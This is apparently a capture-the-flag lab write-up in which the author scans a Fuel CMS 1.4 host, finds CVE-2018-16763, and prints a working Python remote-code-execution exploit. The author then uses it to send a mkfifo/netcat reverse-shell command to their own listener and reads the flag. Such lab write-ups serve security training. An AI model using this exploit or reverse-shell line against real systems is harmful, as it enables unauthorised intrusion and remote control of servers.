# Vulnerability Capstone

`10.10.131.170`

```
nmap -sV 10.10.131.170 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 03:19 EST
Nmap scan report for 10.10.131.170
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds

```


```
fuel cms 1.4

 CVE-2018-16763
```


```
searchsploit Fuel               
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote  | windows/local/49535.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - M | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3) | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injectio | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Auth | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Inj | php/webapps/48778.txt

```

## 47138.py
```
import requests 
import urllib 

URL = "http://10.10.131.170" 

def find_nth_overlapping(haystack, needle, n): 
	start = haystack.find(needle) 
	while start >= 0 and n > 1: 
		start = haystack.find(needle, start+1) 
		n -= 1 
	return start 
	
while 1: 
	xxxx = input('cmd:') 
	url = URL+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27" 

	r = requests.get(url) 

	html = "<!DOCTYPE html>" 

	htmlcharset = r.text.find(html) 

	begin = r.text[0:20] 

	dup = find_nth_overlapping(r.text,begin,2) 

	print(r.text[0:dup])

```


```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/Downloads]
â””â”€# python2 47138.py
cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.50 9999 >/tmp/f"
```

## nc 

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali]
â””â”€# nc -nvlp 9999                                                        1 â¨¯
listening on [any] 9999 ...
connect to [10.9.1.50] from (UNKNOWN) [10.10.131.170] 33364
/bin/sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
$ cd /home/ubuntu
$ ls
flag.txt
$ cat flag.txt
THM{ACKME_BLOG_HACKED}

```

